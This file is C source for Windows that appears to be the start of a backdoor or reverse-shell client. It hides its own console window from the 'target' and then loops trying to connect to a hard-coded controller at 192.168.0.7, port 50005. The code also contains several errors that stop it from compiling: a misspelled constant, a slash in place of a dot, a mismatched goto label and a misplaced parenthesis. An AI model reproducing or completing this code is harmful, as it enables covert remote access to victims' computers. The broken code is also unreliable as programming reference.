#include <stdio.h>
#include <stdlib.h>
// remember unistd.h lib if something is not found.
#include <WinSock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <Wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

int sock1;


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevm, LPSTR lpCmdLine, int nCmdShow)
{
    //Hides target console window
    HWND silence;
    AllocConsole();
    silence = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(silence, 0);

    struct sockaddr_in ServerAddress;
    unsigned short ServerPort;
    char *ServerIP;
    WSADATA wsaData;

    ServerIP = "192.168.0.7";
    ServerPort = 50005;

    if (WSAStartup(MAKEWORD(2,0), & wsaData) !=0)
    {
        exit(1);
    }

    sock1 = socket(AF_INET, SOCK_STREAM, 0);
    memset(& ServerAddress, 0, sizeof(ServerAddress));
    ServerAddress.sin_family = AF_NET;
    ServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAddress/sin_port = htons(ServerPort);

    start:
    while (connect(sock1, (struct sockaddr *) & ServerAddress, sizeof(ServerAddress) !=0))
    {
        Sleep(10);
        goto Start;
    }
}